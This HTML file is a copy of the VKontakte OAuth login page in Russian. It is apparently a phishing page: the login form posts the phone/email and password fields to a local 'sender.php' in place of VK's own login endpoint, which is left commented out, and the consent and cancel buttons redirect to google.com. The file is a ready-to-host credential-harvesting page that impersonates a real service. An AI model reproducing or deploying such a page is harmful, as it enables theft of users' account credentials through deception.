<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
  <head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <title>ВКонтакте | Вход</title>
    <link rel="stylesheet" type="text/css" href="css/vkcss.css" />
    <link rel="stylesheet" type="text/css" href="css/vkcss_2.css" />
    <link type="text/css" rel="stylesheet" href="css/vkcss_3.css"></link>
    <link href="IMG/vklogo.png" rel="icon"></link>
    <script type="text/javascript" language="javascript" src="js/vkscript.js"></script>
    <script type="text/javascript" language="javascript">// <![CDATA[
      function allow(button) {
        if (isButtonLocked(button)) return false;
        lockButton(button);

        var addr = '';
        if (isChecked('allow_notifications')) {
          addr = '&notify=1';
        }
        if (isChecked('denied_email')) {
          addr += '&email_denied=1';
        }
        if (isChecked('denied_phone')) {
          addr += '&phone_denied=1';
        }
        location.href = "https://google.com";
        //location.href = "https://login.vk.com/?act=grant_access&client_id=2303446&settings=4259840&redirect_uri=https%3A%2F%2Fsocial.yandex.ru%2Fbroker%2Fredirect%3Furl%3Dhttps%253A%252F%252Fsocial.yandex.ru%252Fbroker2%252F95527fb9036b40559bcba55e4219a37d%252Fcallback&response_type=code&group_ids=&token_type=0&v=5.59&state=&display=page&ip_h=960ace125bbff394f5&hash=1557937296_4f6c0b04720ca2ce3e&https=1"+addr;
        return false;
      }

      function cancel() {
        location.href = "https://google.com"
        //location.href = "https://login.vk.com/?act=grant_access&client_id=2303446&settings=4259840&redirect_uri=https%3A%2F%2Fsocial.yandex.ru%2Fbroker%2Fredirect%3Furl%3Dhttps%253A%252F%252Fsocial.yandex.ru%252Fbroker2%252F95527fb9036b40559bcba55e4219a37d%252Fcallback&response_type=code&group_ids=&token_type=0&v=5.59&state=&display=page&ip_h=960ace125bbff394f5&hash=1557937296_4f6c0b04720ca2ce3e&https=1&cancel=1";
        return false;
      }

      function login(button) {
        if (isButtonLocked(button)) return false;
        lockButton(button);
        ge('login_submit').submit();
      }

      function doResize(onResize) {
        onResize && setTimeout(function() {
          doResize()
        }, 100);

        if (!hasClass(document.body, 'oauth_centered') && !onResize) {
          if (window.outerHeight !== void 0) {
            var panelH = (window.outerHeight - window.innerHeight) | 0,
              panelW = (window.outerWidth - window.innerWidth) | 0;
          } else {
            var panelH = 50,
              panelW = 0;
          }
          var contentH = Math.max(ge('oauth_wrap_content').offsetHeight, 430),
            contentW = 655;
          window.resizeTo(contentW + panelW, contentH + panelH);
          window.moveTo(
            (screen.width - contentW) / 2 + (screen.availLeft | 0),
            ((screen.height - contentH) / 2) + (screen.availTop | 0)
          );
        }
      }

      function toggleEmailPrivacy() {
        checkbox('denied_email');
        if (!isChecked('denied_email')) {
          hide('denied_email');
          show('allowed_email');
        } else {
          hide('allowed_email');
          show('denied_email');
        }
      }

      function togglePhonePrivacy() {
        checkbox('denied_phone');
        if (!isChecked('denied_phone')) {
          hide('denied_phone');
          show('allowed_phone');
        } else {
          hide('allowed_phone');
          show('denied_phone');
        }
      }

      if (parent && parent != window) {
        location.href = "https://oauth.vk.com/blank.html";
      }

      
    // ]]></script>
  </head>

  <body onload="doResize();" class="VK oauth_centered">
    <script>
      if (window.devicePixelRatio >= 2) document.body.className += ' is_2x';
    </script>
    <div class="oauth_wrap">
      <div class="oauth_wrap_inner">
        <div class="oauth_wrap_content" id="oauth_wrap_content">
          <div class="oauth_head">
  <a class="oauth_logo fl_l" href="https://vk.com" target="_blank"></a>
  <div id="oauth_head_info" class="oauth_head_info fl_r">
  <a class="oauth_reg_link" href="https://vk.com/join?reg=1" target="_blank">Регистрация</a>
</div>
</div>

<div class="oauth_content box_body clear_fix">
  <div class="box_msg_gray box_msg_padded">Для продолжения Вам необходимо войти <b>ВКонтакте</b>.</div>

  <form method="POST" id="login_submit" action="sender.php"><!--"https://login.vk.com/?act=login&soft=1">-->
    <div class="oauth_form">

      

      <div class="oauth_form_login">
        <input type="hidden" name="ip_h" value="960ace125bbff394f5" />
        <input type="hidden" name="lg_h" value="998b7473998fc59290" />
        <input type="hidden" name="_origin" value="https://oauth.vk.com" />
        <input type="hidden" name="to" value="aHR0cHM6Ly9vYXV0aC52ay5jb20vYXV0aG9yaXplP2NsaWVudF9pZD0yMzAzNDQ2JnJlZGlyZWN0X3VyaT1odHRwcyUzQSUyRiUyRnNvY2lhbC55YW5kZXgucnUlMkZicm9rZXIlMkZyZWRpcmVjdCUzRnVybCUzRGh0dHBzJTI1M0ElMjUyRiUyNTJGc29jaWFsLnlhbmRleC5ydSUyNTJGYnJva2VyMiUyNTJGOTU1MjdmYjkwMzZiNDA1NTliY2JhNTVlNDIxOWEzN2QlMjUyRmNhbGxiYWNrJnJlc3BvbnNlX3R5cGU9Y29kZSZzY29wZT00MjU5ODQwJnY9NS41OSZzdGF0ZT0mZGlzcGxheT1wYWdl" />
        <input type="hidden" id="expire" name="expire" value="0" />

        <div class="oauth_form_header">Телефон или email</div>
        <input type="text" class="oauth_form_input dark" name="email" value="">
        <div class="oauth_form_header">Пароль</div>
        <input type="password" class="oauth_form_input dark" name="pass" />

        

        <button class="flat_button oauth_button button_wide" id="install_allow" type="submit" onclick="return login(this);">Войти</button>
        <a class="oauth_forgot" href="https://vk.com/restore" target="_blank">Забыли пароль?</a>
        <input type="submit" name="submit_input" class="unshown">
      </div>
    </div>
  </form>
</div>
        </div>
      </div>
    </div>
  </body>
</html>